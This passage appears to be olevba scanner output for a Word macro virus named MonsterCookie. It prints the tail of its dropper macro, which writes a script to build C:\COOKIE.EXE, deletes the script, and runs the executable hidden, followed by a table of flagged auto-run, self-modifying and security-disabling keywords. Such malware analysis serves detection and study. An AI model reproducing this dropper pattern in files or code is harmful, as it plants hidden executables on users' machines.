Print #1, "11DA"
Print #1, "nC:\COOKIE.EXE"
Print #1, "w"
Print #1, "q"
Close #1
Kill "c:\cookie"
Shell "c:\cookie.exe", vbHide
End Sub




-------------------------------------------------------------------------------
VBA MACRO frmcookiemonster.frm 
in file: Virus.MSWord.MonsterCookie.a - OLE stream: 'Macros/VBA/frmcookiemonster'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Image1_Click()

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|AutoExec  |Image1_Click        |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|AccessVBOM          |May attempt to disable VBA macro security and|
|          |                    |Protected View                               |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |COOKIE.EXE          |Executable file name                         |
|IOC       |cookie.exe          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

